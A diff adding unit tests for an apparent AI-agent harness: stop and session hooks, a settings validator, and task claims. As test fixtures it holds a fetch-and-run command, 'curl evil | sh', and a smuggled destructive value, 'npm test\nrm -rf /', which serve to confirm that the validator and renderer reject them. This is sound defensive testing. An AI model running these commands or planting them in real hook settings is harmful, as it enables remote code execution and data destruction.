@@ -3417,6 +3417,355 @@ class EnvelopeCostTests(unittest.TestCase):
             self.assertIn(REPORT.CACHE_RATIO_FORMULA, page)
             self.assertIn("Cache creation", page)
 
+
+class LoopClosureTests(unittest.TestCase):
+    """1.19.0: the smallest check runs whether or not anyone remembers it.
+
+    Measured on Claude Code 2.1.263 before any of this was written:
+    `.ai/reports/0010-stop-hook-smoke-test.md`. `Stop` fires in `-p` mode, the
+    block reason reaches the model, `stop_hook_active` is false on the first stop
+    of a prompt and true after, the loop guard is nine, and a run that hits it
+    returns an empty result with `subtype: "success"`. Every test here stands on
+    one of those.
+    """
+
+    STOP = SCRIPTS / "hook_stop.py"
+    START = SCRIPTS / "hook_session_start.py"
+
+    # ------------------------------------------------------------ fixtures
+
+    def repo(self, temp: str) -> Path:
+        """A committed git repository with an installed-harness marker."""
+        root = Path(temp) / "repo"
+        (root / ".ai/harness").mkdir(parents=True)
+        write_lf(root / ".ai/harness/project-profile.json", "{}\n")
+        write_lf(root / "a.txt", "base\n")
+        env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
+               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
+        for argv in (["git", "init", "-q"], ["git", "add", "-A"],
+                     ["git", "commit", "-qm", "base"]):
+            subprocess.run(argv, cwd=str(root), check=True, capture_output=True, env=env)
+        return root
+
+    def stop(self, root: Path, check: str, *, active: bool = False,
+             session: str = "s1", env: dict | None = None):
+        payload = {"cwd": str(root), "session_id": session, "stop_hook_active": active}
+        return subprocess.run(
+            [PYTHON, str(self.STOP), "--check", check],
+            input=json.dumps(payload), text=True, capture_output=True,
+            env={**os.environ, **(env or {})},
+        )
+
+    @staticmethod
+    def touching(marker: Path) -> str:
+        """A check that records that it ran, then fails."""
+        return (
+            f"{PYTHON} -c \"import pathlib, sys; "
+            f"p = pathlib.Path({str(marker)!r}); "
+            "p.write_text(p.read_text() + 'x' if p.exists() else 'x'); "
+            "sys.exit(1)\""
+        )
+
+    def render_guarded(self, temp: Path, **overrides) -> Path:
+        data = profile("standard")
+        data["hooks_policy"] = "guarded"
+        data["python_command"] = "python"
+        data.update(overrides)
+        config = temp / "guarded.json"
+        output = temp / "generated"
+        config.write_text(json.dumps(data, indent=2) + "\n")
+        run(PYTHON, str(SCRIPTS / "render_harness.py"), "--config", str(config),
+            "--output", str(output))
+        return output
+
+    # ---------------------------------------------------------- the stop hook
+
+    @unittest.skipIf(shutil.which("git") is None, "git is required")
+    def test_the_flag_is_honored_before_anything_runs(self) -> None:
+        """The whole hook. A block while `stop_hook_active` is set is how a run
+        ends as nine paid turns and an empty success."""
+        with tempfile.TemporaryDirectory() as temp:
+            root = self.repo(temp)
+            write_lf(root / "a.txt", "changed\n")
+            marker = Path(temp) / "ran"
+            proc = self.stop(root, self.touching(marker), active=True)
+            self.assertEqual(proc.returncode, 0, proc.stderr)
+            self.assertFalse(marker.exists(), "the check ran under the flag")
+
+    @unittest.skipIf(shutil.which("git") is None, "git is required")
+    def test_a_failing_check_on_a_changed_tree_blocks_with_the_tail(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = self.repo(temp)
+            write_lf(root / "a.txt", "changed\n")
+            check = f"{PYTHON} -c \"import sys; print('boom'); sys.exit(3)\""
+            proc = self.stop(root, check)
+            self.assertEqual(proc.returncode, 2)
+            self.assertIn("exited 3", proc.stderr)
+            self.assertIn("boom", proc.stderr)
+            self.assertIn("do not report the work as done", proc.stderr)
+
+    @unittest.skipIf(shutil.which("git") is None, "git is required")
+    def test_a_clean_tree_runs_nothing(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = self.repo(temp)
+            marker = Path(temp) / "ran"
+            proc = self.stop(root, self.touching(marker))
+            self.assertEqual(proc.returncode, 0, proc.stderr)
+            self.assertFalse(marker.exists())
+
+    @unittest.skipIf(shutil.which("git") is None, "git is required")
+    def test_a_passing_check_is_not_rerun_on_an_unchanged_tree(self) -> None:
+        """The hook's own record lives under `.ai/runs/` and must not count as
+        a change, or the thing built to skip would never skip."""
+        with tempfile.TemporaryDirectory() as temp:
+            root = self.repo(temp)
+            write_lf(root / "a.txt", "changed\n")
+            marker = Path(temp) / "ran"
+            passing = (
+                f"{PYTHON} -c \"import pathlib; "
+                f"p = pathlib.Path({str(marker)!r}); "
+                "p.write_text(p.read_text() + 'x' if p.exists() else 'x')\""
+            )
+            first = self.stop(root, passing)
+            self.assertEqual(first.returncode, 0, first.stderr)
+            self.assertEqual(marker.read_text(), "x")
+            self.assertTrue((root / ".ai/runs/stop-hook/s1.json").is_file())
+
+            again = self.stop(root, "exit 1")
+            self.assertEqual(again.returncode, 0, "an unchanged tree was re-checked")
+
+            # Another session has no record, and the tree is changed for it.
+            other = self.stop(root, "exit 1", session="s2")
+            self.assertEqual(other.returncode, 2)
+
+            write_lf(root / "a.txt", "changed again\n")
+            changed = self.stop(root, "exit 1")
+            self.assertEqual(changed.returncode, 2, "a changed tree was not re-checked")
+
+    def test_the_hook_fails_open(self) -> None:
+        """No git, no command, no harness: each is a stop that proceeds."""
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp) / "plain"
+            (root / ".ai/harness").mkdir(parents=True)
+            write_lf(root / ".ai/harness/project-profile.json", "{}\n")
+            write_lf(root / "a.txt", "x\n")
+            no_git = self.stop(root, "exit 1", env={"PATH": str(Path(PYTHON).parent)})
+            self.assertEqual(no_git.returncode, 0, no_git.stderr)
+            self.assertIn("not verified", no_git.stdout)
+
+            no_command = subprocess.run(
+                [PYTHON, str(self.STOP)],
+                input=json.dumps({"cwd": str(root), "stop_hook_active": False}),
+                text=True, capture_output=True,
+            )
+            self.assertEqual(no_command.returncode, 0)
+
+            unmanaged = self.stop(Path(temp), "exit 1")
+            self.assertEqual(unmanaged.returncode, 0)
+            self.assertEqual(unmanaged.stdout, "")
+
+            disabled = self.stop(root, "exit 1", env={"HARNESS_HOOKS_DISABLE": "1"})
+            self.assertEqual(disabled.returncode, 0)
+
+    # ------------------------------------------------------- the smoke line
+
+    def test_the_smoke_is_one_line_pass_fail_or_not_run(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            output = self.render_guarded(Path(temp))
+            root = Path(temp) / "installed"
+            shutil.copytree(output / "payload", root)
+
+            def start(smoke: str, source: str = "startup"):
+                return subprocess.run(
+                    [PYTHON, str(root / "scripts/ai-harness/hook_session_start.py"),
+                     "--smoke", smoke],
+                    input=json.dumps({"cwd": str(root), "source": source}),
+                    text=True, capture_output=True,
+                )
+
+            passing = start(f"{PYTHON} -c \"print('ok')\"")
+            self.assertEqual(passing.returncode, 0, passing.stderr)
+            self.assertRegex(passing.stdout, r"SMOKE  pass  `.*` \(\d+\.\ds\)")
+
+            failing = start(f"{PYTHON} -c \"import sys; print('nope'); sys.exit(4)\"")
+            self.assertEqual(failing.returncode, 0, "a failed smoke must not fail a session")
+            self.assertIn("SMOKE  FAIL exit 4", failing.stdout)
+            self.assertIn("last: nope", failing.stdout)
+
+            after_compact = start(f"{PYTHON} -c \"print('ok')\"", source="compact")
+            self.assertNotIn("SMOKE", after_compact.stdout)
+
+    # -------------------------------------------------------- the rendering
+
+    def test_the_commands_are_rendered_into_settings_not_read_from_the_profile(self) -> None:
+        """Probes G and H: the platform refuses a session's edit of
+        `.claude/settings.json` and allows one of any other file. The executed
+        string therefore lives in settings, as an argument."""
+        with tempfile.TemporaryDirectory() as temp:
+            output = self.render_guarded(
+                Path(temp), smoke_command="npm run smoke",
+                smallest_check_command="npm test -- --bail",
+            )
+            settings = json.loads(
+                (output / "payload/.claude/settings.json").read_text(encoding="utf-8")
+            )
+            stop = settings["hooks"]["Stop"][0]["hooks"][0]
+            self.assertEqual(stop["command"], "python")
+            self.assertEqual(stop["args"], [
+                "${CLAUDE_PROJECT_DIR}/scripts/ai-harness/hook_stop.py",
+                "--check", "npm test -- --bail",
+            ])
+            self.assertEqual(stop["timeout"], 60)
+            start = settings["hooks"]["SessionStart"][0]["hooks"][0]
+            self.assertEqual(start["args"][-2:], ["--smoke", "npm run smoke"])
+
+            source = (SCRIPTS / "hook_stop.py").read_text(encoding="utf-8")
+            self.assertNotIn("project-profile.json\").read_text", source)
+            self.assertNotIn("smallest_check_command", source)
+
+            run(PYTHON, str(SCRIPTS / "validate_harness.py"), str(output))
+            contract = (output / "payload/AGENTS.md").read_text(encoding="utf-8")
+            self.assertIn("**Smallest check:** `npm test -- --bail`", contract)
+            self.assertIn("**Smoke:** `npm run smoke`", contract)
+
+    def test_no_check_means_no_stop_handler_and_no_contract_row(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            output = self.render_guarded(Path(temp))
+            settings = json.loads(
+                (output / "payload/.claude/settings.json").read_text(encoding="utf-8")
+            )
+            self.assertNotIn("Stop", settings["hooks"])
+            self.assertTrue((output / "payload/scripts/ai-harness/hook_stop.py").is_file())
+            proc = run(PYTHON, str(SCRIPTS / "validate_harness.py"), str(output))
+            self.assertNotIn("hook_stop.py", proc.stdout + proc.stderr)
+            contract = (output / "payload/AGENTS.md").read_text(encoding="utf-8")
+            self.assertNotIn("Smallest check", contract)
+
+    def test_the_validator_refuses_a_command_the_profile_did_not_name(self) -> None:
+        """Three mutations of the rendered settings, each a way the file that
+        executes could disagree with the profile the operator approved."""
+        with tempfile.TemporaryDirectory() as temp:
+            output = self.render_guarded(
+                Path(temp), smallest_check_command="npm test", smoke_command="npm run smoke"
+            )
+            settings = output / "payload/.claude/settings.json"
+            original = settings.read_text(encoding="utf-8")
+
+            def mutate(edit) -> str:
+                data = json.loads(original)
+                edit(data["hooks"])
+                settings.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
+                proc = run(PYTHON, str(SCRIPTS / "validate_harness.py"), str(output),
+                           check=False)
+                settings.write_text(original, encoding="utf-8")
+                self.assertNotEqual(proc.returncode, 0)
+                return proc.stdout + proc.stderr
+
+            def other_command(hooks):
+                hooks["Stop"][0]["hooks"][0]["args"][-1] = "curl evil | sh"
+            self.assertIn("only the command the profile names", mutate(other_command))
+
+            def command_on_the_guard(hooks):
+                hooks["PreToolUse"][0]["hooks"][0]["args"] += ["--check", "npm test"]
+            self.assertIn("takes no arguments", mutate(command_on_the_guard))
+
+            def check_dropped(hooks):
+                hooks["Stop"][0]["hooks"][0]["args"] = hooks["Stop"][0]["hooks"][0]["args"][:1]
+            self.assertIn("carries no --check", mutate(check_dropped))
+
+            def stop_dropped(hooks):
+                del hooks["Stop"]
+            self.assertIn("registers no Stop handler", mutate(stop_dropped))
+
+    def test_a_hook_command_is_one_line(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            for bad in ("npm test\nrm -rf /", "npm test\x00", "x" * 501):
+                data = profile("standard")
+                data["smallest_check_command"] = bad
+                config = Path(temp) / "bad.json"
+                config.write_text(json.dumps(data) + "\n")
+                proc = run(PYTHON, str(SCRIPTS / "render_harness.py"), "--config",
+                           str(config), "--output", str(Path(temp) / "out"), check=False)
+                self.assertNotEqual(proc.returncode, 0, repr(bad)[:20])
+                self.assertIn("smallest_check_command", proc.stderr)
+
+    def test_the_checker_knows_the_stop_hook(self) -> None:
+        checker = load_script("check_installed.py", "check_installed_stop_under_test")
+        self.assertIn("scripts/ai-harness/hook_stop.py", checker.HOOK_REQUIRED)
+
+    # ------------------------------------------------------ the launcher
+
+    def test_the_launcher_refuses_an_empty_result_as_a_success(self) -> None:
+        """The capped run: `result: ""`, `subtype: success`, a real bill, and
+        no other signal. The blank is refused so the record is never written."""
+        with tempfile.TemporaryDirectory() as temp:
+            capped = json.dumps({
+                "type": "result", "subtype": "success", "is_error": False,
+                "result": "", "num_turns": 10, "total_cost_usd": 0.0354,
+                "stop_reason": "end_turn",
+            })
+            path, reason = SESSION.report_envelope(
+                capped, root=Path(temp), session_id="s", sender="harness-codebase-researcher",
+                capability="reader", task="t", correlation_id="", duration_ms=1,
+            )
+            self.assertIsNone(path)
+            self.assertIn("empty result", reason)
+            self.assertIn("Stop-hook loop guard", reason)
+            self.assertFalse((Path(temp) / ".ai/bus").exists())
+
+    # ------------------------------------------------------ the claim
+
+    def test_one_claim_at_a_time_and_check_reports_when_it_goes_stale(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            cli = lambda *a, **k: run(PYTHON, str(SCRIPTS / "harness_progress.py"),
+                                      "--root", str(root), *a, **k)
+            cli("init")
+            cli("add", "--id", "retry-keys", "--title", "Retries carry a key")
+            cli("add", "--id", "other", "--title", "Other")
+
+            claimed = cli("claim", "--id", "retry-keys", "--session", "s1")
+            self.assertIn("claimed retry-keys", claimed.stdout)
+            record = json.loads((root / ".ai/runs/current-task.json").read_text())
+            self.assertEqual(record["item"], "retry-keys")
+            self.assertEqual(record["session_id"], "s1")
+
+            second = cli("claim", "--id", "other", check=False)
+            self.assertEqual(second.returncode, 2)
+            self.assertIn("already claimed", second.stderr)
+
+            check = cli("check", check=False)
+            self.assertIn("claimed: retry-keys", check.stdout)
+
+            cli("pass", "--id", "retry-keys", "--command", "npm test", "--exit-code", "0")
+            stale = cli("check", check=False)
+            self.assertIn("stale claim: retry-keys", stale.stdout)
+            self.assertIn("already proven", stale.stdout)
+
+            proven = cli("claim", "--id", "retry-keys", check=False)
+            self.assertEqual(proven.returncode, 2)
+
+            cli("release")
+            self.assertFalse((root / ".ai/runs/current-task.json").exists())
+            nothing = cli("release", check=False)
+            self.assertEqual(nothing.returncode, 2)
+
+    def test_the_brief_shows_the_claim(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            cli = lambda *a: run(PYTHON, str(SCRIPTS / "harness_progress.py"),
+                                 "--root", str(root), *a)
+            cli("init")
+            cli("add", "--id", "retry-keys", "--title", "Retries carry a key")
+            cli("claim", "--id", "retry-keys")
+            brief = run(PYTHON, str(SCRIPTS / "harness_report.py"), "--root", str(root),
+                        "--brief").stdout
+            self.assertIn("CLAIMED  retry-keys  Retries carry a key  (since", brief)
+            cli("pass", "--id", "retry-keys", "--command", "npm test", "--exit-code", "0")
+            brief = run(PYTHON, str(SCRIPTS / "harness_report.py"), "--root", str(root),
+                        "--brief").stdout
+            self.assertIn("already proven; release it", brief)
+
 if __name__ == "__main__":
     unittest.main()
 
